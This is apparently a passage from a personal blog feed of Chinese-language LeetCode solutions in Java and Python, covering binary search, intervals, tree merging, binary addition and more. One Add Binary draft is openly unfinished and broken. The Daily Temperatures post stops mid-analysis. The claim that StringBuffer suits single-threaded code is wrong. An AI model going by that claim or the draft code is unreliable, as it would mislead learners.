<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>根据分析给出的 corner case, 题目给出的测试用例已经基本覆盖，只需再加上给定数组为空的情况</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [], <span class="number">2</span></span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>



<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == nums || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">         	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      	<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (target &gt; nums[right]) &#123;</span><br><span class="line">			<span class="keyword">return</span> right + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="keyword">if</span> (target &lt; nums[left]) &#123;</span><br><span class="line">          	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">      	<span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">          	<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">          	<span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">              	left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">              	right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注意:</p>
<ol>
<li>即便数组只有一个元素也要进行二分查找，因此 while 循环中的条件是 <code>left &lt;= right</code> ，<strong>要有 <code>=</code></strong></li>
<li>如果进入 while 循环且查找失败，则 left 的值一定大于 right，此时 left 的位置正好代表查找元素所应该处于的位置，所以返回 left.</li>
<li>计算 mid 时候，考虑大数相加溢出，因此使用 <code>mid = left + ((right - left) &gt;&gt; 1)</code> 计算 mid 的值，其中 <code>&gt;&gt;</code> 是位运算，相当于 <code>/</code>，如果您不熟悉位运算可以改为如下表达式<code> mid = left + (right - left)/2</code></li>
</ol>
<p>代码提交后，运行时打败 100.00% 的提交，内存打败 98.22% 的提交，可以说近乎完美。</p>
<p><img src="/images/2019-07/lc-35-01.png"></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Search</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-435 non-overlapping intervals</title>
    <url>/fundamental/algorithm/lc-435-non-overlapping-intervals/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given a collection of intervals, find the minimum number of intervals you need to remove to make the rest of the intervals non-overlapping.</p>
<p><strong>Note:</strong></p>
<ol>
<li>You may assume the interval’s end point is always bigger than its start point.</li>
<li>Intervals like [1,2] and [2,3] have borders “touching” but they don’t overlap each other.</li>
</ol>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [ [1,2], [2,3], [3,4], [1,3] ]</span><br><span class="line"></span><br><span class="line">Output: 1</span><br><span class="line"></span><br><span class="line">Explanation: [1,3] can be removed and the rest of intervals are non-overlapping.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [ [1,2], [1,2], [1,2] ]</span><br><span class="line"></span><br><span class="line">Output: 2</span><br><span class="line"></span><br><span class="line">Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [ [1,2], [2,3] ]</span><br><span class="line"></span><br><span class="line">Output: 0</span><br><span class="line"></span><br><span class="line">Explanation: You don&#x27;t need to remove any of the intervals since they&#x27;re already non-overlapping.</span><br></pre></td></tr></table></figure>

<p><strong>NOTE:</strong> input types have been changed on April 15, 2019. Please reset to default code definition to get new method signature.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li><p>首先以第一个元素的为基准对各个区间排序</p>
</li>
<li><p>初始化冲突计数器为 0，设置两个指针，一前一后，每个指针指向一个区间</p>
</li>
<li><p>如果两个指针指向的区间有冲突，则<strong>前指针指向最小覆盖的区间</strong>，后指针向后移动一个区间，冲突计数器加一</p>
</li>
<li><p>如果两指针指向的区间没有冲突，则两指针平滑向后移动一个区间</p>
</li>
<li><p>返回冲突计数器中的值。</p>
</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p><strong>储备知识</strong></p>
<ul>
<li><p>Java 比较器</p>
<p>区间的排序是依据第一个元素进行比较操作的。Java 有两种方式提供比较功能，其一是实现  Comparable 接口，使类具有比较的功能。第二种是实现 Comperator 接口，比较规则定义在该接口提供的 compare 方法中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">IntervalComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;Interval&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Interval a, Interval b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a.start - b.start;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中 Interval 对象定义如下</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Interval</span> &#123;</span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">    Interval(<span class="type">int</span> start, <span class="type">int</span> end) &#123;</span><br><span class="line">        <span class="built_in">this</span>.start = start;</span><br><span class="line">        <span class="built_in">this</span>.end = end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Java 8 中，还可以使用 Lambda 表达式创建比较器，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.sort(intervals, (Interval x, Interval y) -&gt; x.start - y.start);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>代码如下</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">eraseOverlapIntervals</span><span class="params">(<span class="type">int</span>[][] intervals)</span> &#123;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="literal">null</span> == intervals || intervals.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">conflict</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        Arrays.sort(intervals, (<span class="type">int</span>[] x, <span class="type">int</span>[] y) -&gt; x[<span class="number">0</span>] - y[<span class="number">0</span>] );</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; intervals.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[j][<span class="number">1</span>] &gt; intervals[i][<span class="number">0</span>]) &#123;</span><br><span class="line">                conflict++;</span><br><span class="line">                <span class="comment">// j point min zone</span></span><br><span class="line">                j = intervals[j][<span class="number">1</span>] &lt; intervals[i][<span class="number">1</span>] ? j : i;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conflict;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>本例使用的是贪心思想，如果有冲突，则指针指向最小覆盖区间，这就是贪心的思想。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-650 —— 2 Keys Keyboard</title>
    <url>/fundamental/algorithm/lc-650-2-keys-keyboard/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>剪切板中初始状态下只有一个字母 ‘A’，只允许复制全部和粘贴全部操作，使用最小的操作步骤得到 n 个字符 ‘A’。</p>
<span id="more"></span>


<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>根据题意，n 的取值区间为 <code>[1, 1000]</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Case 0: n 等于 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Case 1: n 是偶数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Case 2: n 是奇数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Case 3: 你是质数</span></span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li><p>如果 n 是偶数，<code>f(n) = f(n/2) + 2</code> 复制一次，粘贴一次</p>
</li>
<li><p>如果 n 是奇数，</p>
<ul>
<li>若 n 是质数，则 <code>f(n) = n</code></li>
<li>零 m * x &#x3D;&#x3D; n，假设 x &gt;&#x3D; m 则  <code>f(n) = m + f(x)</code>，复制一次，粘贴 m - 1次。</li>
</ul>
</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSteps</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="comment">#1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">n</span>):</span><br><span class="line">            <span class="keyword">if</span> n &lt;= <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> calc(n//<span class="number">2</span>) + <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = <span class="built_in">int</span>(math.sqrt(n))</span><br><span class="line">                m = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, r+<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">                        m = n // i</span><br><span class="line">                        <span class="keyword">break</span>   <span class="comment">#2</span></span><br><span class="line">                <span class="keyword">if</span> m &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> n // m + calc(m)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> n</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> calc(n)</span><br></pre></td></tr></table></figure>

<p>注意两点：</p>
<ul>
<li><p>#1考虑 n &#x3D;&#x3D; 1 的基本情况</p>
</li>
<li><p>#2 找最大因数时找到之后一定要跳出循环</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-617 Merge Two Binary Trees</title>
    <url>/fundamental/algorithm/lc-617-merge-tow-binary-trees/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given two binary trees and imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not.</p>
<p>You need to merge them into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of new tree.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: </span><br><span class="line">	Tree 1                     Tree 2                  </span><br><span class="line">          1                         2                             </span><br><span class="line">         / \                       / \                            </span><br><span class="line">        3   2                     1   3                        </span><br><span class="line">       /                           \   \                      </span><br><span class="line">      5                             4   7                  </span><br><span class="line">Output: </span><br><span class="line">Merged tree:</span><br><span class="line">	     3</span><br><span class="line">	    / \</span><br><span class="line">	   4   5</span><br><span class="line">	  / \   \ </span><br><span class="line">	 5   4   7</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> The merging process must start from the root nodes of both trees.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>合并两棵二叉树，如果节点有交集则两个节点的和作为新节点，否则非空节点作为新节点。</p>
<p>从两棵树的 root 节点开始合并，假设合并到了某个节点 t，则考虑如下情况：</p>
<ol>
<li><p>如果 t1 和 t2 都不为 null，那么 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">t.val = t1.val + t2.val;</span><br><span class="line">t.left = 递归(t1.left, t2.left);</span><br><span class="line">t.right = 递归(t1.right, t2.right);</span><br><span class="line"><span class="keyword">return</span> t;</span><br></pre></td></tr></table></figure>


</li>
<li><p>如果 t1 为 null，那么返回 t2</p>
</li>
<li><p>如果 t2 为 null，那么返回 t1</p>
</li>
</ol>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>根据分析，写出代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (t1 == <span class="literal">null</span>) <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span> (t2 == <span class="literal">null</span>) <span class="keyword">return</span> t1;</span><br><span class="line">        </span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(t1.val+t2.val);</span><br><span class="line">        t.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">        t.right = mergeTrees(t1.right, t2.right);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>一遍过，bugfree~~</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-739 Daily Temperatures</title>
    <url>/fundamental/algorithm/lc-739-daily-temperatures/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given a list of daily temperatures <code>T</code>, return a list such that, for each day in the input, tells you how many days you would have to wait until a warmer temperature. If there is no future day for which this is possible, put <code>0</code> instead.</p>
<p>For example, given the list of temperatures <code>T = [73, 74, 75, 71, 69, 72, 76, 73]</code>, your output should be <code>[1, 1, 4, 2, 1, 1, 0, 0]</code>.</p>
<p><strong>Note:</strong> The length of <code>temperatures</code> will be in the range <code>[1, 30000]</code>. Each temperature will be an integer in the range <code>[30, 100]</code>.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给定一个数组代表每天的气温，查找多少天之后天气比今天更暖和。首先，想到了暴力算法，如下，</p>
<ol>
<li>遍历 T</li>
<li>对于第 i 个元素，另 j &#x3D; i，从 i 开始往后寻找比 T[i] 大的元素，如果找到则 <code>j - i</code> 为第 i 号元素的目标值</li>
<li>重复步骤 2 直到最后一位</li>
</ol>
<p>给定数组为降序排列时，暴力算法复杂度为 O(n^2)，数组的长度在 [1, 30000]，暴力算法可能会超时。迫于没有想到更好的解题思路，只能对暴力算法先做优化，如果数组是升序的，算法复杂都是 O(n)，所以很乐观，主要考虑优化降序的部分。</p>
<p>考虑如下情况，数组先增后降，</p>
<p><img src="/images/2019-08/lc-739-01.jpeg"></p>
<p>下降转折点到末尾数组元素单调递减，因此每个元素后面都不会有大于他们的元素</p>
<p>如果单调递减后有转折点，那么单调递减的部分元素可能会存在</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-67 —— Add Binary</title>
    <url>/fundamental/algorithm/lc-67-add-binary/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given two binary strings, return their sum (also a binary string).</p>
<p>The input strings are both <strong>non-empty</strong> and contains only characters <code>1</code> or <code>0</code>.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: a = &quot;11&quot;, b = &quot;1&quot;</span><br><span class="line">Output: &quot;100&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: a = &quot;1010&quot;, b = &quot;1011&quot;</span><br><span class="line">Output: &quot;10101&quot;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给定两个只包含 0 和 1 的非空字符串，求他们的二进制和。有题意得知，题目给定的字符串是合法的，可以省略输入合法性校验。</p>
<p>我们需要考虑的如下两个问题：</p>
<ul>
<li>a 和 b 的长度不一样</li>
<li>进位问题 (carry)</li>
</ul>
<p>按如下步骤，</p>
<ol>
<li>先选择字符串长度较小者为基准对字符串做反向遍历</li>
<li>每次遍历对对应字符和进位求和 ，再对和对 2 分别取余和取整，<strong>余数插入新字符串的头部</strong>，整数作为进位。</li>
<li>重复步骤 2 直到循环结束。</li>
<li>循环结束后如果进位非 0，则进位再与剩下的字符相加(如果有剩余字符)</li>
<li>返回结果</li>
</ol>
<h2 id="朴素解法"><a href="#朴素解法" class="headerlink" title="朴素解法"></a>朴素解法</h2><p><strong>储备知识</strong></p>
<ul>
<li><p>String vs StringBuilder</p>
<p>在 Java 中，和常量一样 String 是不可变的(immutable) ，因此，对字符串做可变(insert&#x2F;update&#x2F;delete等)操作时，会产生新的字符串，旧的字符串会当作垃圾丢弃。频繁的字符串操作严重降低了性能，对垃圾回收造成较大压力，所以 Java 提供 StringBuilder 类型用于字符串的可变操作， StringBuilder 提供了 append、delete、insert 等接口。</p>
</li>
<li><p>StringBuilder vs StringBuffer</p>
<p>StringBuffer 和 StringBuilder 类似，也是用于字符串的可变操作。然而任何操作在多线程中都会存在状态同步(原子操作&#x2F;一致性)问题，StringBuffer 是线程安全的，因此开销会大一些，在单线程中使用 StringBuffer 对字符串做操作是较好的选择。</p>
</li>
<li><p>StringBuilder 提供的接口</p>
<p>StringBuilder 含有 String 的大部分方法(是否是继承同一个父类？或实现同一个接口？没做过调查)</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>想要的操作</th>
<th>提供的接口</th>
<th>注解</th>
</tr>
</thead>
<tbody><tr>
<td>追加一个字符串</td>
<td>append(String s)</td>
<td>也可以追加 char&#x2F;int&#x2F;boolean等类型，功能和 <code>+</code> 类似</td>
</tr>
<tr>
<td>删除指定位置的字符</td>
<td>deleteCharAt(int index)</td>
<td></td>
</tr>
<tr>
<td>指定位置插入字符</td>
<td>insert(int offset, char x)</td>
<td>也可以插入String&#x2F;int&#x2F;boolean 等</td>
</tr>
</tbody></table>
<p><strong>代码</strong></p>
<p>按照如上分析，我们可以使用 StringBuilder 对字符串做操作，使用其提供的 insert 方法实现头部插入，具体如下(代码未实现完)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">aLen</span> <span class="operator">=</span> a.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">bLen</span> <span class="operator">=</span> b.length();</span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line">        <span class="keyword">if</span> (aLen &lt; bLen) &#123;</span><br><span class="line">            i = aLen - <span class="number">1</span>;</span><br><span class="line">            j = bLen - aLen - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = bLen - <span class="number">1</span>;</span><br><span class="line">            j = aLen - bLen - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> (a.charAt(i) - <span class="string">&#x27;0&#x27;</span>) + (b.charAt(i) - <span class="string">&#x27;0&#x27;</span>) + carry;</span><br><span class="line">            carry = (sum &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            result.insert(<span class="number">0</span>, sum % <span class="number">2</span>);</span><br><span class="line">        	i--;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    	<span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// int sum = (a.charAt(i) - &#x27;0&#x27;) + (b.charAt(i) - &#x27;0&#x27;) + carry;</span></span><br><span class="line">            carry = (sum &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            result.insert(<span class="number">0</span>, sum % <span class="number">2</span>);</span><br><span class="line">        	j--;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.insert(<span class="number">0</span>, carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写了 80% 的时候发现，特殊逻辑太多，进来先判断 a 和 b 的长度，后续还要做一次判断，该方法太繁琐，我决定再作思考，优化特殊逻辑。</p>
<p>刚去了一趟厕所，想了一下可以在循环体中做特殊逻辑，如下，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> b.length() - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        	<span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                num1 = (a.charAt(i) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        	<span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            	num2 = (b.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> num1 + num2 + carry;</span><br><span class="line">            carry = (sum &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            result.insert(<span class="number">0</span>, sum % <span class="number">2</span>);</span><br><span class="line">        	i--;</span><br><span class="line">        	j--;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.insert(<span class="number">0</span>, carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交后 Ac 了，内存使用打败 99.94%，时间就刚刚及格，62.66%。分析了以下，慢的原因是多次头部插入 <code>result.insert</code>，像这个问题，每次遍历的时候会往头部插入，最后输出有从头开始，很典型的<strong>先进后出</strong>问题，用栈优化以下就好啦。</p>
<h2 id="使用-Stack"><a href="#使用-Stack" class="headerlink" title="使用  Stack"></a>使用  Stack</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> b.length() - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        Stack&lt;Integer&gt; bucket = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        	<span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                num1 = (a.charAt(i) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        	<span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            	num2 = (b.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> num1 + num2 + carry;</span><br><span class="line">            carry = (sum &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            bucket.push(sum % <span class="number">2</span>);</span><br><span class="line">        	i--;</span><br><span class="line">        	j--;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            bucket.push(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!bucket.isEmpty()) &#123;</span><br><span class="line">			result.append(bucket.pop());            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来打算使用 Stack 优化朴素算法中的频繁 Insert 问题，结果花费了 3ms，之战胜了 13% 的提交，最终参考了别人的提交，优化思路是每次都在结果中 append，最后在 reverse 字符串。</p>
